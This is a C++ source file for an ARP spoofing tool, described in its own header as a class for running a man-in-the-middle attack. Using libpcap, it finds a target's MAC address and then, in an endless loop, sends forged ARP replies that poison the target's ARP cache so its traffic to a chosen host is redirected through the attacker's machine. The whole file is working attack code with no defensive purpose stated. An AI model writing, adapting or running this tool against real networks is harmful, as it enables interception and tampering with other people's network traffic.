/*!
  * \file ArpSpoofing.cpp
  * \brief Class for run MITM attack.
  * \author Jeremy ZYRA
  * \version 1.0
*/
#include "ArpSpoofing.hpp"

ArpSpoofing::ArpSpoofing(char *iface, char *target, char *destination) {
	char errbuf[PCAP_ERRBUF_SIZE];
	//Open network interface with libpcap
	if ((_iface = pcap_open_live(iface, PACKET_SIZE, PROMISC_MODE, TIMEOUT_MS, errbuf)) != NULL) {
		//Get network device's IPV4 adress.
		uint8Ip deviceIp = NetworkUtilities::getIpAddr(iface);
		//Get network device's MAC adress.
		ucharMac deviceMac = NetworkUtilities::getMacAddr(iface);
		//Loop for copy IP adress to class's attributes.
		for (int i=0; i<4; ++i) {
			_targetIp.datas[i] = ((inet_addr(target) >> (i*8)) & 0xFF);
			_destIp.datas[i] = ((inet_addr(destination) >> (i*8)) & 0xFF);
			_deviceIp.datas[i] = deviceIp.datas[i];
		}
		for (int i=0; i<6; ++i) {
			_deviceMac.datas[i] = deviceMac.datas[i];
		}
	} else {
		cerr << "[-] Error: " << errbuf << endl;
		exit(1);
	}
}

void ArpSpoofing::run() {
	ucharMac *targetMac;
	cout << "[+] Start ARP spoofing." << endl;
	//Get MAC adress of target.
	targetMac = getTargetMac();
	if(targetMac != NULL) {
		Arp isAt(_iface);
		isAt.setSrcMac(_deviceMac);
		isAt.setDstMac(*targetMac);
		//Is at ARP request.
		isAt.setOp(0x0200);
		isAt.setSrcArpMac(_deviceMac);
		isAt.setDstArpMac(*targetMac);
		isAt.setSrcIp(_destIp);
		isAt.setDstIp(_targetIp);
		cout << "[+] Target's MAC address is: ";
		NetworkUtilities::printUcharMac(*targetMac);
		cout << endl;
		for(;;) {
			//Send trame for corrupt target's ARP cache.
			if(isAt.send() != 0) {
				cerr << "[-] Error for send packet." << endl;
			} else {
				cout << "-> Send ARP [";
				NetworkUtilities::printUint8Ip(_destIp);
				cout << " is at ";
				NetworkUtilities::printUcharMac(_deviceMac);
				cout << "] to ";
				NetworkUtilities::printUint8Ip(_targetIp);
				cout << endl;
			}
			sleep(TIME_SLEEP);
		}
		delete targetMac;
	} else {
		cerr << "[-] Error: Can't find target's MAC adress." << endl;
		exit(1);
	}
}

ucharMac *ArpSpoofing::getTargetMac() {
	ucharMac *mac = new ucharMac;
	ucharMac broadcast;
	struct bpf_program fp;
	const u_char *packet;
	struct pcap_pkthdr header;
	struct ether_arp *arpHeader;
	Arp request(_iface);
	//Fill broadcast MAC adress
	for (int i = 0; i<6; ++i) {
		broadcast.datas[i] = 0xff;
	}
	//ARP request for get MAC adress to target.
	request.setSrcMac(_deviceMac);
	request.setDstMac(broadcast);
	//Request ARP request.
	request.setOp(0x0100);
	request.setSrcArpMac(_deviceMac);
	request.setSrcIp(_deviceIp);
	request.setDstIp(_targetIp);
	request.send();
	//Comile pcap filter for get next arp reply.
	pcap_compile(_iface, &fp, "arp", 0x100, PCAP_NETMASK_UNKNOWN);
	pcap_setfilter(_iface, &fp);
	//Get reply with target's MAC adress.
	packet = pcap_next(_iface, &header);
	if (packet != NULL) {
		//Copy ARP header of ARP reply.
		arpHeader = (struct ether_arp *)(packet + sizeof(struct ether_header));
		for (int i=0; i < 6; ++i) {
			mac->datas[i] = arpHeader->arp_sha[i];
		}
		return mac;
	} else {
		return NULL;
	}
}
